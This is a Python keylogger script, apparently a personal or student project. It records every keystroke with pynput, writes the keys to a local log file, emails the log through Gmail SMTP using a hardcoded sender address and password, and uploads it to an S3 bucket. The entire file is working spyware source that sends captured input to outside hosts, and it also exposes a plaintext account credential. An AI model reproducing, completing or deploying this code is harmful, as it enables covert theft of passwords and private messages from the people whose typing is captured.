# Import necessary libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import os
import time
from pynput.keyboard import Key, Listener
import boto3


# Email Configuration
email_address = "keyloggerproject10@gmail.com"
password = "Project@123"
toaddr = "divyanshgupta1406@gmail.com"

# File Paths
file_path = "C:\\Python_For_Divyansh\\API-keylogger\\project"
keys_information = "key_log.txt"
file_merge = os.path.join(file_path, keys_information)

# Function to send email with logs
def send_email(filename, attachment, toaddr):
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "KeyLogger Log File"
    body = "Logged keystrokes are attached."
    msg.attach(MIMEText(body, 'plain'))

    with open(attachment, 'rb') as file:
        p = MIMEBase('application', 'octet-stream')
        p.set_payload(file.read())

    encoders.encode_base64(p)
    p.add_header('Content-Disposition', f"attachment; filename={filename}")
    msg.attach(p)

    # Send the email
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, password)
    server.sendmail(fromaddr, toaddr, msg.as_string())
    server.quit()

# Function to write keystrokes to a file
def write_file(keys):
    with open(file_merge, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)

# Function to log keystrokes
keys = []
def on_press(key):
    global keys
    print(f"Key Pressed: {key}")  # Debugging (Remove later)
    keys.append(key)

    if len(keys) >= 10:  # Save after 10 keystrokes
        write_file(keys)
        keys = []

def on_release(key):
    if key == Key.esc:  # Stop on Esc key
        return False

# Start keylogger
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Send email with logs after execution
send_email(keys_information, file_merge, toaddr)

# AWS Credentials (Replace with your actual credentials)
AWS_ACCESS_KEY = "YOUR_ACCESS_KEY"
AWS_SECRET_KEY = "YOUR_SECRET_KEY"
BUCKET_NAME = "my-keylogger-bucket"

# AWS S3 Client
s3 = boto3.client("s3", aws_access_key_id=AWS_ACCESS_KEY, aws_secret_access_key=AWS_SECRET_KEY)

def upload_to_s3(file_path, bucket_name):
    file_name = os.path.basename(file_path)
    s3.upload_file(file_path, bucket_name, file_name)
    print(f"✅ Uploaded {file_name} to S3!")

# Call this function after logging keystrokes
upload_to_s3(file_merge, BUCKET_NAME)
